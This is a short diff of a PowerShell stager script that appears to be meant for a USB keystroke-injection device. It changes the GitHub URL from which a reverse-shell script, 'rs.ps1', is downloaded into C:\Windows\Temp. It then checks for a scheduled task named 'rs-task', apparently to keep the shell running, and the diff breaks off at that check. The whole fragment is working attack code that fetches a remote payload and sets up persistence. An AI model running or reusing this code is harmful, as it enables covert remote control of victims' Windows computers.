@@ -1,5 +1,5 @@
 $client = New-Object System.Net.WebClient
-$client.DownloadFile('https://raw.githubusercontent.com/XALM1337X/Quick-Reverse-Powershell-Rubber-Ducky/master/rs.ps1', 'C:\\Windows\\Temp\\rs.ps1')
+$client.DownloadFile('https://raw.githubusercontent.com/XALM1337X/attiny85_rshell/master/rs.ps1', 'C:\\Windows\\Temp\\rs.ps1')
 
 $taskExists = Get-ScheduledTask | Where-Object {$_.TaskName -like "rs-task" }
 if($taskExists) {
